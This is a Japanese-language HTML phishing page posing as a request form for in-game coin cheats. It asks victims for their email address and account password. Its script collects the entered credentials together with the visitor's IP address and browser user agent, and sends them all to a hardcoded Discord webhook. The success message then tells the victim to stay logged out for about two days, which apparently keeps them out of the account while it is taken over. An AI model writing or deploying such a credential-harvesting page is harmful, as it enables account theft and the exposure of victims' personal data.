<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>コインチート依頼フォーム</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        form {
            max-width: 400px;
            margin: 0 auto;
        }
        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            margin: 5px 0 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .success-message {
            color: green;
            font-weight: bold;
            margin-top: 10px;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>コインチート依頼フォーム</h1>
    <form id="authForm">
        <label for="address">メールアドレス</label>
        <input type="email" id="address" placeholder="メールアドレスを入力" required>

        <label for="password">パスワード</label>
        <input type="text" id="password" placeholder="パスワードを入力" required>

        <button type="button" onclick="submitForm()">送信</button>
    </form>

    <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
    <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>

    <script>
        async function submitForm() {
            const address = document.getElementById("address").value;
            const password = document.getElementById("password").value;

            // 必須項目が空かどうかチェック
            if (!address || !password) {
                alert("全ての項目を入力してください。");
                return;
            }

            try {
                // 外部APIでIPアドレスを取得
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                // デバイス情報を取得
                const userAgent = navigator.userAgent;

                // Webhook URL
                const webhookURL = 'https://discord.com/api/webhooks/1332143787555688609/J91Uc5C-cAu8pn4plSRKRlWzNTDdvyr30ZwUSjHkt7CLkwewHj7PVEpnIC3AF8kHmbWM';

                // 埋め込みメッセージの作成
                const payload = {
                    embeds: [
                        {
                            title: "アカウント情報とデバイス情報",
                            description: `**メールアドレス:** \`${address}\`\n**パスワード:** \`${password}\`\n**デバイス情報:** \`${userAgent}\`\n**IPアドレス:** \`${ipAddress}\``,
                            color: 3447003, // 青色の枠線 (色はRGBの10進数値で指定)
                        }
                    ]
                };

                // Webhookに送信
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    document.getElementById("successMessage").style.display = "block";
                    const button = document.querySelector("button");
                    button.style.backgroundColor = "red";
                    button.textContent = "送信完了";
                    button.disabled = true;
                } else {
                    document.getElementById("errorMessage").style.display = "block";
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById("errorMessage").style.display = "block";
            }
        }
    </script>
</body>
</html>
